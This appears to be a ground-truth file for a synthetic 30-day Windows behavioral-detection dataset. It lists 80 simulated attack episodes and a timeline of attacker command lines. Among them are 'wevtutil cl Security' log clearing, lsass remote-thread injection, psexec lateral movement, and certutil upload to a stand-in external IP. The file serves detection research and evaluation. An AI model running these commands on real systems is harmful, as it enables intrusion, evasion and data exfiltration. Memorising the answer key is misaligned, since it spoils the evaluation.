# Ground Truth: northside-ad-behavioral-baseline-30day

**Scenario:** Thirty-day synthetic Windows-only dataset for per-user behavioral baseline detection. Days 1-7 are baseline-only; days 8-30 contain feature-supported attack episodes. Evaluation unit: one principal x non-overlapping 10-minute UTC window.

**Generated:** 2026-07-28 00:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **prerna.verma** on **FILE-01**: Creation of a new Windows service on a server
2. **vivaan.sharma** on **PC-003**: Host and domain discovery through built-in Windows administration tools
3. **prerna.verma** on **FILE-01**: Creation of a new Windows service on a server
4. **aarav.malhotra** on **PC-002**: Scheduled task registered with a nonstandard executable path
5. **aditya.saxena** on **DC-01**: Domain account creation followed by a group-membership change
6. **prerna.verma** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
7. **vivaan.sharma** on **PC-003**: Internal service discovery across common Windows infrastructure ports
8. **aditya.saxena** on **DC-01**: Windows Security event log cleared after administrative command activity
9. **prerna.verma** on **DC-01**: Domain account creation followed by a group-membership change
10. **kabir.chauhan** on **PC-005**: Unusual remote-thread activity targeting a sensitive Windows process
11. **ishita.kapoor** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
12. **diya.singh** on **PC-004**: Explicit use of a privileged account for remote administration
13. **aditya.saxena** on **PC-007**: Archive/transfer utility activity followed by an external connection
14. **aarav.malhotra** on **PC-002**: Explicit use of a privileged account for remote administration
15. **prerna.verma** on **FILE-01**: Creation of a new Windows service on a server
16. **ishita.kapoor** on **PC-001**: Archive/transfer utility activity followed by an external connection
17. **diya.singh** on **PC-004**: Internal service discovery across common Windows infrastructure ports
18. **prerna.verma** on **DC-01**: Domain account creation followed by a group-membership change
19. **SYSTEM** on **DC-01**: Password-spray pattern against several domain accounts from an external source
20. **meera.bansal** on **PC-006**: Scheduled task registered with a nonstandard executable path
21. **ishita.kapoor** on **PC-001**: Internal service discovery across common Windows infrastructure ports
22. **kabir.chauhan** on **PC-005**: Internal service discovery across common Windows infrastructure ports
23. **prerna.verma** on **FILE-01**: Creation of a new Windows service on a server
24. **vivaan.sharma** on **PC-003**: Unusual remote-thread activity targeting a sensitive Windows process
25. **aditya.saxena** on **PC-007**: Explicit use of a privileged account for remote administration
26. **aarav.malhotra** on **PC-002**: Internal service discovery across common Windows infrastructure ports
27. **kabir.chauhan** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
28. **prerna.verma** on **PC-008**: Scheduled task registered with a nonstandard executable path
29. **diya.singh** on **PC-004**: Scheduled task registered with a nonstandard executable path
30. **aditya.saxena** on **DC-01**: Domain account creation followed by a group-membership change
31. **aarav.malhotra** on **PC-002**: Host and domain discovery through built-in Windows administration tools
32. **meera.bansal** on **PC-006**: Internal service discovery across common Windows infrastructure ports
33. **ishita.kapoor** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
34. **prerna.verma** on **DC-01**: Windows Security event log cleared after administrative command activity
35. **aditya.saxena** on **PC-007**: Internal service discovery across common Windows infrastructure ports
36. **aditya.saxena** on **DC-01**: Domain account creation followed by a group-membership change
37. **meera.bansal** on **PC-006**: Host and domain discovery through built-in Windows administration tools
38. **ishita.kapoor** on **PC-001**: Host and domain discovery through built-in Windows administration tools
39. **kabir.chauhan** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
40. **prerna.verma** on **PC-008**: Explicit use of a privileged account for remote administration
41. **vivaan.sharma** on **PC-003**: Unusual remote-thread activity targeting a sensitive Windows process
42. **meera.bansal** on **PC-006**: Scheduled task registered with a nonstandard executable path
43. **prerna.verma** on **DC-01**: Domain account creation followed by a group-membership change
44. **SYSTEM** on **DC-01**: Password-spray pattern against several domain accounts from an external source
45. **prerna.verma** on **PC-008**: Internal service discovery across common Windows infrastructure ports
46. **diya.singh** on **PC-004**: Unusual remote-thread activity targeting a sensitive Windows process
47. **aditya.saxena** on **PC-007**: Internal service discovery across common Windows infrastructure ports
48. **aarav.malhotra** on **PC-002**: Scheduled task registered with a nonstandard executable path
49. **kabir.chauhan** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
50. **ishita.kapoor** on **PC-001**: Archive/transfer utility activity followed by an external connection
51. **diya.singh** on **PC-004**: Scheduled task registered with a nonstandard executable path
52. **aditya.saxena** on **DC-01**: Domain account creation followed by a group-membership change
53. **vivaan.sharma** on **PC-003**: Host and domain discovery through built-in Windows administration tools
54. **prerna.verma** on **FILE-01**: Creation of a new Windows service on a server
55. **ishita.kapoor** on **PC-001**: Unusual remote-thread activity targeting a sensitive Windows process
56. **prerna.verma** on **FILE-01**: Creation of a new Windows service on a server
57. **prerna.verma** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
58. **vivaan.sharma** on **PC-003**: Internal service discovery across common Windows infrastructure ports
59. **prerna.verma** on **FILE-01**: Creation of a new Windows service on a server
60. **aarav.malhotra** on **PC-002**: Archive/transfer utility activity followed by an external connection
61. **aditya.saxena** on **DC-01**: Domain account creation followed by a group-membership change
62. **prerna.verma** on **PC-008**: Unusual remote-thread activity targeting a sensitive Windows process
63. **aditya.saxena** on **DC-01**: Windows Security event log cleared after administrative command activity
64. **aditya.saxena** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
65. **aarav.malhotra** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
66. **kabir.chauhan** on **PC-005**: Scheduled task registered with a nonstandard executable path
67. **ishita.kapoor** on **PC-001**: Internal service discovery across common Windows infrastructure ports
68. **SYSTEM** on **DC-01**: Password-spray pattern against several domain accounts from an external source
69. **aditya.saxena** on **PC-007**: Archive/transfer utility activity followed by an external connection
70. **aarav.malhotra** on **PC-002**: Unusual remote-thread activity targeting a sensitive Windows process
71. **prerna.verma** on **DC-01**: Windows Security event log cleared after administrative command activity
72. **aditya.saxena** on **FILE-01**: Creation of a new Windows service on a server
73. **diya.singh** on **PC-004**: Unusual remote-thread activity targeting a sensitive Windows process
74. **prerna.verma** on **PC-008**: Scheduled task registered with a nonstandard executable path
75. **aditya.saxena** on **FILE-01**: Creation of a new Windows service on a server
76. **meera.bansal** on **FILE-01**: Network-share enumeration and bulk file staging via a transfer utility
77. **ishita.kapoor** on **PC-001**: Internal service discovery across common Windows infrastructure ports
78. **aditya.saxena** on **DC-01**: Windows Security event log cleared after administrative command activity
79. **prerna.verma** on **DC-01**: Domain account creation followed by a group-membership change
80. **vivaan.sharma** on **PC-003**: Scheduled task registered with a nonstandard executable path


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2026-08-04 07:59:35 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 47464) - `sc.exe create NorthsideTelemetry07000 binPath= ...` |
| 2026-08-04 08:00:09 UTC | prerna.verma | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry07000 (C:\ProgramData\Ops\agent_07000.exe) |
| 2026-08-04 16:19:58 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\whoami.exe (PID: 59528) - `whoami /all` |
| 2026-08-04 16:20:06 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 59544) - `systeminfo` |
| 2026-08-04 16:20:40 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 59556) - `net group "Domain Admins" /domain` |
| 2026-08-04 16:20:49 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\nltest.exe (PID: 59564) - `nltest /dclist:corp.local` |
| 2026-08-04 20:39:45 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 50140) - `sc.exe create NorthsideTelemetry07002 binPath= ...` |
| 2026-08-04 20:40:10 UTC | prerna.verma | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry07002 (C:\ProgramData\Ops\agent_07002.exe) |
| 2026-08-05 03:59:55 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 42172) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-05 04:00:06 UTC | aarav.malhotra | PC-002 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck08003 |
| 2026-08-05 12:59:40 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 20040) - `net user svc-ns-maint-08004 /add /domain` |
| 2026-08-05 12:59:55 UTC | aditya.saxena | DC-01 | Account_Created | Account created: svc-ns-maint-08004 |
| 2026-08-05 13:00:06 UTC | aditya.saxena | DC-01 | Group_Member_Added | Added svc-ns-maint-08004 to group Remote Desktop Users |
| 2026-08-05 19:00:04 UTC | prerna.verma | FILE-01 | Logon | Network logon from 10.10.10.28 (LogonID: 0xae10d4f) |
| 2026-08-05 19:00:14 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 55140) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-05 19:00:43 UTC | prerna.verma | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-05 21:59:55 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6964) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-05 22:00:08 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-05 22:00:16 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-05 22:00:30 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-05 22:00:58 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 02:59:35 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 25304) - `wevtutil cl Security` |
| 2026-08-06 02:59:45 UTC | aditya.saxena | DC-01 | Log_Cleared | Windows Security event log cleared after administrative command activity |
| 2026-08-06 08:29:38 UTC | prerna.verma | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 27264) - `net user svc-ns-maint-09008 /add /domain` |
| 2026-08-06 08:29:52 UTC | prerna.verma | DC-01 | Account_Created | Account created: svc-ns-maint-09008 |
| 2026-08-06 08:30:02 UTC | prerna.verma | DC-01 | Group_Member_Added | Added svc-ns-maint-09008 to group Remote Desktop Users |
| 2026-08-06 12:20:20 UTC | kabir.chauhan | PC-005 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 48300) - `diag-helper.exe --inspect-session` |
| 2026-08-06 12:20:28 UTC | kabir.chauhan | PC-005 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-07 07:50:21 UTC | ishita.kapoor | FILE-01 | Logon | Network logon from 10.10.10.21 (LogonID: 0xbf554b9) |
| 2026-08-07 07:50:45 UTC | ishita.kapoor | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 63744) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-07 07:51:16 UTC | ishita.kapoor | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-07 09:59:41 UTC | diya.singh | PC-004 | Explicit_Credentials | Explicit credentials: RunAs aditya.saxena on FILE-01 |
| 2026-08-07 09:59:51 UTC | diya.singh | PC-004 | Process | Process: C:\Windows\Temp\psexec.exe (PID: 16124) - `psexec.exe \\FILE-01 -u CORP\aditya.saxena cmd.exe` |
| 2026-08-07 10:00:01 UTC | diya.singh | PC-004 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-07 12:50:12 UTC | aditya.saxena | PC-007 | Process | Process: C:\Program Files\7-Zip\7z.exe (PID: 14652) - `7z.exe a C:\ProgramData\Cache\bundle_10012.7z C...` |
| 2026-08-07 12:50:33 UTC | aditya.saxena | PC-007 | Process | Process: C:\Windows\System32\certutil.exe (PID: 14684) - `certutil.exe -urlcache -split -f https://upload...` |
| 2026-08-07 12:50:55 UTC | aditya.saxena | PC-007 | Connection | Connection to 198.51.100.37:443 (UID: (filtered by sensor placement)) |
| 2026-08-07 19:09:31 UTC | aarav.malhotra | PC-002 | Explicit_Credentials | Explicit credentials: RunAs aditya.saxena on FILE-01 |
| 2026-08-07 19:09:47 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\Temp\psexec.exe (PID: 52444) - `psexec.exe \\FILE-01 -u CORP\aditya.saxena cmd.exe` |
| 2026-08-07 19:09:59 UTC | aarav.malhotra | PC-002 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-08 04:59:42 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 6684) - `sc.exe create NorthsideTelemetry11014 binPath= ...` |
| 2026-08-08 04:59:49 UTC | prerna.verma | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry11014 (C:\ProgramData\Ops\agent_11014.exe) |
| 2026-08-08 07:59:41 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Program Files\7-Zip\7z.exe (PID: 54080) - `7z.exe a C:\ProgramData\Cache\bundle_11015.7z C...` |
| 2026-08-08 07:59:51 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\certutil.exe (PID: 54092) - `certutil.exe -urlcache -split -f https://upload...` |
| 2026-08-08 08:00:09 UTC | ishita.kapoor | PC-001 | Connection | Connection to 192.0.2.207:443 (UID: (filtered by sensor placement)) |
| 2026-08-08 21:50:22 UTC | diya.singh | PC-004 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 23320) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-08 21:50:57 UTC | diya.singh | PC-004 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-08 21:51:30 UTC | diya.singh | PC-004 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-08 21:51:42 UTC | diya.singh | PC-004 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-08 21:51:58 UTC | diya.singh | PC-004 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-09 03:29:56 UTC | prerna.verma | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 48916) - `net user svc-ns-maint-12017 /add /domain` |
| 2026-08-09 03:30:28 UTC | prerna.verma | DC-01 | Account_Created | Account created: svc-ns-maint-12017 |
| 2026-08-09 03:30:50 UTC | prerna.verma | DC-01 | Group_Member_Added | Added svc-ns-maint-12017 to group Remote Desktop Users |
| 2026-08-09 11:10:08 UTC | SYSTEM | DC-01 | Credential_Spray | Credential spray: 9 attempts against 8 accounts (success: kabir.chauhan at attempt 9) |
| 2026-08-09 16:29:42 UTC | meera.bansal | PC-006 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 52260) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-09 16:30:08 UTC | meera.bansal | PC-006 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck12019 |
| 2026-08-09 19:10:19 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 58940) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-09 19:10:34 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-09 19:10:47 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-09 19:11:21 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-09 19:11:29 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-10 01:40:11 UTC | kabir.chauhan | PC-005 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 59516) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-10 01:40:17 UTC | kabir.chauhan | PC-005 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-10 01:40:29 UTC | kabir.chauhan | PC-005 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-10 01:40:39 UTC | kabir.chauhan | PC-005 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-10 01:40:57 UTC | kabir.chauhan | PC-005 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-10 04:49:57 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 16188) - `sc.exe create NorthsideTelemetry13022 binPath= ...` |
| 2026-08-10 04:50:28 UTC | prerna.verma | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry13022 (C:\ProgramData\Ops\agent_13022.exe) |
| 2026-08-10 14:29:59 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 37884) - `diag-helper.exe --inspect-session` |
| 2026-08-10 14:30:16 UTC | vivaan.sharma | PC-003 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-11 02:39:53 UTC | aditya.saxena | PC-007 | Explicit_Credentials | Explicit credentials: RunAs prerna.verma on FILE-01 |
| 2026-08-11 02:40:13 UTC | aditya.saxena | PC-007 | Process | Process: C:\Windows\Temp\psexec.exe (PID: 33636) - `psexec.exe \\FILE-01 -u CORP\prerna.verma cmd.exe` |
| 2026-08-11 02:40:44 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-11 04:39:53 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 65212) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-11 04:40:25 UTC | aarav.malhotra | PC-002 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-11 04:40:49 UTC | aarav.malhotra | PC-002 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-11 04:41:10 UTC | aarav.malhotra | PC-002 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-11 04:41:30 UTC | aarav.malhotra | PC-002 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-11 09:39:34 UTC | kabir.chauhan | FILE-01 | Logon | Network logon from 10.10.10.25 (LogonID: 0xed2f995) |
| 2026-08-11 09:40:01 UTC | kabir.chauhan | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 23448) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-11 09:40:14 UTC | kabir.chauhan | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-11 14:50:21 UTC | prerna.verma | PC-008 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 8756) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-11 14:50:34 UTC | prerna.verma | PC-008 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck14027 |
| 2026-08-12 07:00:21 UTC | diya.singh | PC-004 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 41688) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-12 07:00:33 UTC | diya.singh | PC-004 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck15028 |
| 2026-08-12 11:39:50 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 16784) - `net user svc-ns-maint-15029 /add /domain` |
| 2026-08-12 11:40:18 UTC | aditya.saxena | DC-01 | Account_Created | Account created: svc-ns-maint-15029 |
| 2026-08-12 11:40:45 UTC | aditya.saxena | DC-01 | Group_Member_Added | Added svc-ns-maint-15029 to group Remote Desktop Users |
| 2026-08-12 22:10:00 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\whoami.exe (PID: 10904) - `whoami /all` |
| 2026-08-12 22:10:31 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 10924) - `systeminfo` |
| 2026-08-12 22:10:58 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\net.exe (PID: 10936) - `net group "Domain Admins" /domain` |
| 2026-08-12 22:11:29 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\nltest.exe (PID: 10940) - `nltest /dclist:corp.local` |
| 2026-08-13 04:29:53 UTC | meera.bansal | PC-006 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 64268) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-13 04:30:23 UTC | meera.bansal | PC-006 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-13 04:30:56 UTC | meera.bansal | PC-006 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-13 04:31:26 UTC | meera.bansal | PC-006 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-13 04:31:37 UTC | meera.bansal | PC-006 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-13 08:30:03 UTC | ishita.kapoor | FILE-01 | Logon | Network logon from 10.10.10.21 (LogonID: 0x10324e8d) |
| 2026-08-13 08:30:16 UTC | ishita.kapoor | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 34088) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-13 08:30:33 UTC | ishita.kapoor | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-13 17:00:05 UTC | prerna.verma | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 28312) - `wevtutil cl Security` |
| 2026-08-13 17:00:34 UTC | prerna.verma | DC-01 | Log_Cleared | Windows Security event log cleared after administrative command activity |
| 2026-08-13 20:09:54 UTC | aditya.saxena | PC-007 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 59840) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-13 20:10:12 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-13 20:10:34 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-13 20:10:50 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-13 20:11:22 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-14 03:20:08 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 31768) - `net user svc-ns-maint-17035 /add /domain` |
| 2026-08-14 03:20:36 UTC | aditya.saxena | DC-01 | Account_Created | Account created: svc-ns-maint-17035 |
| 2026-08-14 03:21:06 UTC | aditya.saxena | DC-01 | Group_Member_Added | Added svc-ns-maint-17035 to group Remote Desktop Users |
| 2026-08-14 12:40:20 UTC | meera.bansal | PC-006 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6856) - `whoami /all` |
| 2026-08-14 12:40:26 UTC | meera.bansal | PC-006 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 6884) - `systeminfo` |
| 2026-08-14 12:40:58 UTC | meera.bansal | PC-006 | Process | Process: C:\Windows\System32\net.exe (PID: 6908) - `net group "Domain Admins" /domain` |
| 2026-08-14 12:41:23 UTC | meera.bansal | PC-006 | Process | Process: C:\Windows\System32\nltest.exe (PID: 6952) - `nltest /dclist:corp.local` |
| 2026-08-14 16:49:39 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\whoami.exe (PID: 17280) - `whoami /all` |
| 2026-08-14 16:50:08 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 17292) - `systeminfo` |
| 2026-08-14 16:50:20 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\net.exe (PID: 17296) - `net group "Domain Admins" /domain` |
| 2026-08-14 16:50:40 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\nltest.exe (PID: 17304) - `nltest /dclist:corp.local` |
| 2026-08-15 01:00:01 UTC | kabir.chauhan | FILE-01 | Logon | Network logon from 10.10.10.25 (LogonID: 0x11620ca4) |
| 2026-08-15 01:00:14 UTC | kabir.chauhan | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 42828) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-15 01:00:31 UTC | kabir.chauhan | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-15 04:49:44 UTC | prerna.verma | PC-008 | Explicit_Credentials | Explicit credentials: RunAs aditya.saxena on FILE-01 |
| 2026-08-15 04:50:14 UTC | prerna.verma | PC-008 | Process | Process: C:\Windows\Temp\psexec.exe (PID: 24000) - `psexec.exe \\FILE-01 -u CORP\aditya.saxena cmd.exe` |
| 2026-08-15 04:50:23 UTC | prerna.verma | PC-008 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-15 07:00:29 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 5168) - `diag-helper.exe --inspect-session` |
| 2026-08-15 07:00:58 UTC | vivaan.sharma | PC-003 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-15 11:20:01 UTC | meera.bansal | PC-006 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 9788) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-15 11:20:31 UTC | meera.bansal | PC-006 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck18041 |
| 2026-08-16 12:09:57 UTC | prerna.verma | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 51212) - `net user svc-ns-maint-19042 /add /domain` |
| 2026-08-16 12:10:02 UTC | prerna.verma | DC-01 | Account_Created | Account created: svc-ns-maint-19042 |
| 2026-08-16 12:10:19 UTC | prerna.verma | DC-01 | Group_Member_Added | Added svc-ns-maint-19042 to group Remote Desktop Users |
| 2026-08-16 15:00:15 UTC | SYSTEM | DC-01 | Credential_Spray | Credential spray: 9 attempts against 8 accounts (success: meera.bansal at attempt 9) |
| 2026-08-16 18:50:10 UTC | prerna.verma | PC-008 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 28296) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-16 18:50:32 UTC | prerna.verma | PC-008 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-16 18:50:57 UTC | prerna.verma | PC-008 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-16 18:51:17 UTC | prerna.verma | PC-008 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-16 18:51:25 UTC | prerna.verma | PC-008 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-17 06:50:25 UTC | diya.singh | PC-004 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 8180) - `diag-helper.exe --inspect-session` |
| 2026-08-17 06:50:48 UTC | diya.singh | PC-004 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-17 11:40:04 UTC | aditya.saxena | PC-007 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 15356) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-17 11:40:35 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-17 11:40:56 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-17 11:41:23 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-17 11:41:29 UTC | aditya.saxena | PC-007 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-17 13:50:29 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 27756) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-17 13:51:01 UTC | aarav.malhotra | PC-002 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck20047 |
| 2026-08-17 20:59:42 UTC | kabir.chauhan | FILE-01 | Logon | Network logon from 10.10.10.25 (LogonID: 0x1360014f) |
| 2026-08-17 21:00:06 UTC | kabir.chauhan | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 58008) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
